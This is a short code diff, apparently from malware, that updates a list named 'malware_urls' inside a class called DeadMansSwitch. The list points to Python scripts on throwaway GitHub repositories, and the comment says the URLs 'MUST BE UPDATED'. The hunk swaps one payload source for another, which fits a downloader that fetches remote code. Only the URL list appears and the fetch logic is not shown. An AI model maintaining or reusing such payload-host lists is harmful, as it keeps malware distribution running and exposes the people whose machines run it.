@@ -121,7 +121,7 @@ class DeadMansSwitch:
         # Configuration URLs (MUST BE UPDATED)
         self.malware_urls = [
             "https://raw.githubusercontent.com/dpsdow/stunning-engine123324345/refs/heads/main/deepseek_python_20251123_1133b4%20-%20Copy.py",
-            "https://raw.githubusercontent.com/nuojjijia/jubilant-waffle21q3wsedfr5gt6/refs/heads/main/deepseek_python_20251118_1133b4.py",
+            "https://raw.githubusercontent.com/nuojjijia/ubiquitous-succotasha2123456/refs/heads/main/deepseek_python_20251123_1133b4%20-%20Copy.py",
             "https://raw.githubusercontent.com/shadow788878/curly-meme13erthg3rewrgdgf/main/deepseek_python_20251118_1133b4.py"
         ]
         
